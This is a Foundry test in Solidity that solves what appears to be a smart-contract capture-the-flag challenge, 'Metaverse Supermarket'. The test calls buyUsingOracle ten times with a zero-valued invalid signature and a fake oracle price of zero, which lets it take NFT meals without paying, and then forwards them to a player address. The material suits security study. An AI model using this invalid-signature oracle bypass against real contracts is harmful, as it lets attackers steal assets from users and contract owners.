// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../src/ChallengeMetaverseSupermarket.sol";

contract MetaverseSupermarketTest is Test {
    InflaStore inflaStore;
    Meal meal;
    Infla inflaToken;
    address player;
    uint256 mealsToSteal;

    function setUp() external {
        player = address(bytes20(abi.encodePacked(keccak256("PLAYER"))));
        inflaStore = new InflaStore(player);
        meal = inflaStore.meal();
        inflaToken = inflaStore.infla();
        mealsToSteal = 10;
    }

    function testAttack() external {
        // Attack
        Signature memory invalidSignature = Signature({v: 27, r: 0, s: 0});
        OraclePrice memory fakePrice = OraclePrice({
            blockNumber: block.number,
            price: 0
        });
        for (uint256 i; i < mealsToSteal; ++i) {
            inflaStore.buyUsingOracle(fakePrice, invalidSignature);
        }

        // Check attack success
        require(_isComplete(), "ATTACK FAILED");
    }

    function onERC721Received(
        address _to,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        // Transfer received meals to player
        meal.transferFrom(address(this), player, _tokenId);

        return this.onERC721Received.selector;
    }

    ///////////
    // HELPERS
    ///////////
    function _isComplete() internal view returns (bool) {
        return meal.balanceOf(player) >= 10;
    }
}
